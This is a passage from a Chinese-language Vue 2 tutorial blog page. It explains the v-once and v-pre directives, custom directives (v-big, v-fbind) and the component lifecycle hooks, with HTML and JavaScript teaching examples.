class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;cess&#x27;</span>&#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>v-once指令 ：</strong>(用的少)</p><ul><li><p>v-once所在节点在初次动态渲染后，就视为静态内容了。</p></li><li><p>以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>v-once指令<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-once</span>&gt;</span>初始化的n值是: &#123;&#123;n&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>当前的n值是: &#123;&#123;n&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123; <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>, <span class="hljs-attr">data</span>: &#123;<span class="hljs-attr">n</span>:<span class="hljs-number">1</span>&#125; &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><strong>v-pre指令 ：</strong>(比较没用)</p><ul><li><p>跳过其所在节点的编译过程</p></li><li><p>可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>v-pre指令<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-pre</span>&gt;</span>Vue其实很简单<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> &gt;</span>当前的n值是:&#123;&#123;n&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123; <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#root&#x27;</span>, <span class="hljs-attr">data</span>:&#123;<span class="hljs-attr">n</span>:<span class="hljs-number">1</span>&#125; &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="1-18-自定义指令"><a href="#1-18-自定义指令" class="headerlink" title="1.18 自定义指令"></a>1.18 自定义指令</h2><p>需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。</p><p>需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。</p><p><strong>语法 ：</strong></p><ol><li><p>局部指令</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">new Vue(&#123;<br>  directives:&#123; <br>    指令名:配置对象 <br>  &#125;   <br>&#125;)<br><br>new Vue(&#123;<br>  directives:&#123; <br>    指令名:回调函数 <br>  &#125;   <br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>全局指令</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html">Vue.directive(指令名, 配置对象)<br>或<br>Vue.directive(指令名, 回调函数)<br><br><br>Vue.directive(&#x27;fbind&#x27;, &#123;<br>    // 指令与元素成功绑定时（一上来）<br>    bind(element, binding) &#123;// element就是DOM元素，binding就是要绑定的<br>      element.value = binding.value<br>    &#125;,<br>    // 指令所在元素被插入页面时<br>    inserted(element, binding) &#123;<br>      element.focus()<br>    &#125;,<br>    // 指令所在的模板被重新解析时<br>    update(element, binding) &#123;<br>      element.value = binding.value<br>    &#125;<br>&#125;)<br></code></pre></td></tr></table></figure><ul><li>配置对象中常用的3个回调函数 <ul><li><p>bind(element, binding) 指令与元素成功绑定时调用</p></li><li><p>inserted(element, binding)指令所在元素被插入页面时调用</p></li><li><p>update(element, binding) 指令所在模板结构被重新解析时调用</p></li><li><p>element就是DOM元素，binding就是要绑定的对象，它包含以下属性：<code>name</code> <code>value</code> <code>expression</code> <code>arg</code> <code>modifiers</code></p></li><li><p>备注</p><ul><li><p>指令定义时不加v-，但使用时要加v-</p></li><li><p>指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名</p></li></ul></li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html">new Vue(&#123;<br>el: &#x27;#root&#x27;,<br>data: &#123;<br>n:1<br>&#125;,<br>directives: &#123;<br>&#x27;big-number&#x27;(element,binding) &#123;<br>element.innerText = binding.value * 10<br>&#125;<br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>回顾一个DOM操作</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"><span class="hljs-selector-class">.demo</span>&#123;<span class="hljs-attribute">background-color</span>: orange;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;btn&quot;</span>&gt;</span>点我创建一个输入框<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> &gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">const</span> btn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;btn&#x27;</span>)</span><br><span class="language-javascript">  btn.<span class="hljs-property">onclick</span> = <span class="hljs-function">()=&gt;</span>&#123;</span><br><span class="language-javascript">    <span class="hljs-keyword">const</span> input = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&#x27;input&#x27;</span>)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    input.<span class="hljs-property">className</span> = <span class="hljs-string">&#x27;demo&#x27;</span></span><br><span class="language-javascript">    input.<span class="hljs-property">value</span> = <span class="hljs-number">99</span></span><br><span class="language-javascript">    input.<span class="hljs-property">onclick</span> = <span class="hljs-function">()=&gt;</span>&#123;<span class="hljs-title function_">alert</span>(<span class="hljs-number">1</span>)&#125;</span><br><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(input)</span><br><span class="language-javascript"></span><br><span class="language-javascript">    input.<span class="hljs-title function_">focus</span>()</span><br><span class="language-javascript">    input.<span class="hljs-property">parentElement</span>.<span class="hljs-property">style</span>.<span class="hljs-property">backgroundColor</span> = <span class="hljs-string">&#x27;skyblue&#x27;</span></span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><p>需求1：定义一个v-big指令，和v-text功能类似，但会把绑定的数值放大10倍。</p><p>需求2：定义一个v-fbind指令，和v-bind功能类似，但可以让其所绑定的input元素默认获取焦点。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>自定义指令<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>当前的n值是：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-text</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- &lt;h2&gt;放大10倍后的n值是：&lt;span v-big-number=&quot;n&quot;&gt;&lt;/span&gt; &lt;/h2&gt; --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>放大10倍后的n值是：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-big</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;n++&quot;</span>&gt;</span>点我n+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">hr</span> /&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-fbind:value</span>=<span class="hljs-string">&quot;n&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 定义全局指令</span></span><br><span class="language-javascript">  <span class="hljs-comment">/* Vue.directive(&#x27;fbind&#x27;,&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">// 指令与元素成功绑定时（一上来）</span></span><br><span class="hljs-comment"><span class="language-javascript">bind(element,binding)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">element.value = binding.value</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">// 指令所在元素被插入页面时</span></span><br><span class="hljs-comment"><span class="language-javascript">inserted(element,binding)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">element.focus()</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;,</span></span><br><span class="hljs-comment"><span class="language-javascript">// 指令所在的模板被重新解析时</span></span><br><span class="hljs-comment"><span class="language-javascript">update(element,binding)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">element.value = binding.value</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;) */</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;尚硅谷&#x27;</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">n</span>: <span class="hljs-number">1</span></span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">directives</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">// big函数何时会被调用？</span></span><br><span class="language-javascript">      <span class="hljs-comment">// 1.指令与元素成功绑定时（一上来） 2.指令所在的模板被重新解析时</span></span><br><span class="language-javascript">      <span class="hljs-comment">/* &#x27;big-number&#x27;(element,binding)&#123;</span></span><br><span class="hljs-comment"><span class="language-javascript">// console.log(&#x27;big&#x27;)</span></span><br><span class="hljs-comment"><span class="language-javascript">element.innerText = binding.value * 10</span></span><br><span class="hljs-comment"><span class="language-javascript">&#125;, */</span></span><br><span class="language-javascript">      <span class="hljs-title function_">big</span>(<span class="hljs-params">element, binding</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;big&#x27;</span>, <span class="hljs-variable language_">this</span>) <span class="hljs-comment">// 🔴注意此处的 this 是 window</span></span><br><span class="language-javascript">        <span class="hljs-comment">// console.log(&#x27;big&#x27;)</span></span><br><span class="language-javascript">        element.<span class="hljs-property">innerText</span> = binding.<span class="hljs-property">value</span> * <span class="hljs-number">10</span></span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-attr">fbind</span>: &#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// 指令与元素成功绑定时（一上来）</span></span><br><span class="language-javascript">        <span class="hljs-title function_">bind</span>(<span class="hljs-params">element, binding</span>) &#123;</span><br><span class="language-javascript">          element.<span class="hljs-property">value</span> = binding.<span class="hljs-property">value</span></span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-comment">// 指令所在元素被插入页面时</span></span><br><span class="language-javascript">        <span class="hljs-title function_">inserted</span>(<span class="hljs-params">element, binding</span>) &#123;</span><br><span class="language-javascript">          element.<span class="hljs-title function_">focus</span>()</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-comment">// 指令所在的模板被重新解析时</span></span><br><span class="language-javascript">        <span class="hljs-title function_">update</span>(<span class="hljs-params">element, binding</span>) &#123;</span><br><span class="language-javascript">          element.<span class="hljs-property">value</span> = binding.<span class="hljs-property">value</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="1-19-生命周期"><a href="#1-19-生命周期" class="headerlink" title="1.19 生命周期"></a>1.19 生命周期</h2><ol><li><p>又名生命周期回调函数、生命周期函数、生命周期钩子</p></li><li><p>是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数</p></li><li><p>生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的</p></li><li><p>生命周期函数中的 this 指向是vm或组件实例对象</p></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>引出生命周期<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span>你好啊<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>看笔记学Vue<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-title class_">Vue</span>.<span class="hljs-property">config</span>.<span class="hljs-property">productionTip</span> = <span class="hljs-literal">false</span></span><br><span class="language-javascript">  <span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">    <span class="hljs-attr">el</span>: <span class="hljs-string">&#x27;#root&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-attr">a</span>: <span class="hljs-literal">false</span>,</span><br><span class="language-javascript">      <span class="hljs-attr">opacity</span>: <span class="hljs-number">1</span></span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-comment">// 🔴Vue 完成模板的解析并把初始的真实 DOM 元素放入页面后（挂载完毕）调用 mounted</span></span><br><span class="language-javascript">    <span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;mounted&#x27;</span>, <span class="hljs-variable language_">this</span>)</span><br><span class="language-javascript">      <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> -= <span class="hljs-number">0.01</span></span><br><span class="language-javascript">        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> &lt;= <span class="hljs-number">0</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-property">opacity</span> = <span class="hljs-number">1</span></span><br><span class="language-javascript">      &#125;, <span class="hljs-number">16</span>)</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">  &#125;)</span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-comment">// 通过外部的定时器实现（不推荐）</span></span><br><span class="language-javascript">  <span class="hljs-comment">// setInterval(() =&gt; &#123;</span></span><br><span class="language-javascript">  <span class="hljs-comment">// vm.opacity -= 0.01</span></span><br><span class="language-javascript">  <span class="hljs-comment">// if(vm.opacity &lt;= 0) vm.opacity = 1</span></span><br><span class="language-javascript">  <span class="hljs-comment">// &#125;,16)</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="简介生命周期"><a href="#简介生命周期" class="headerlink" title="简介生命周期"></a>简介生命周期</h3><p>Vue 实例有⼀个完整的⽣命周期，也就是从new Vue()、初始化事件(.once事件)和生命周期、编译模版、挂载Dom -&gt; 渲染、更新 -&gt;<br>渲染、卸载 等⼀系列过程，称这是Vue的⽣命周期。</p><p>先来一张尚硅谷的图：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221124120234807.png" alt="image-20221124120234807"></p><ol><li><p><strong>beforeCreate （创建前）</strong>：数据监测(getter和setter)和初始化事件还未开始，此时 data 的响应式追踪、event&#x2F;watcher 都还没有被设置，也就是说不能访问到data、computed、watch、methods上的方法和数据。</p></li><li><p><strong>created （创建后）</strong>：实例创建完成，实例上配置的 options 包括 data、computed、watch、methods 等都配置完成，但是此时渲染得节点还未挂载到 DOM，所以不能访问到 <code>$el</code>属性。</p></li><li><p><strong>beforeMount （挂载前）</strong>：在挂载开始之前被调用，相关的render函数首次被调用。此阶段Vue开始解析模板，生成虚拟DOM存在内存中，还没有把虚拟DOM转换成真实DOM，插入页面中。所以网页不能显示解析好的内容。</p></li><li><p><strong>mounted （挂载后）</strong>：在el被新创建的 vm.$el（就是真实DOM的拷贝）替换，并挂载到实例上去之后调用（将内存中的虚拟DOM转为真实DOM，真实DOM插入页面）。此时页面中呈现的是经过Vue编译的DOM，这时在这个钩子函数中对DOM的操作可以有效，但要尽量避免。一般在这个阶段进行：开启定时器，发送网络请求，订阅消息，绑定自定义事件等等</p></li><li><p><strong>beforeUpdate （更新前）</strong>：响应式数据更新时调用，此时虽然响应式数据更新了，但是对应的真实 DOM 还没有被渲染（数据是新的，但页面是旧的，页面和数据没保持同步呢）。</p></li><li><p><strong>updated （更新后）</strong> ：在由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。此时 DOM 已经根据响应式数据的变化更新了。调用时，组件 DOM已经更新，所以可以执行依赖于DOM的操作。然而在大多数情况下，应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。</p></li><li><p><strong>beforeDestroy （销毁前）</strong>：实例销毁之前调用。这一步，实例仍然完全可用，<code>this</code> 仍能获取到实例。在这个阶段一般进行关闭定时器，取消订阅消息，解绑自定义事件。</p></li><li><p><strong>destroyed （销毁后）</strong>：实例销毁后调用，调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务端渲染期间不被调用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs html"><span 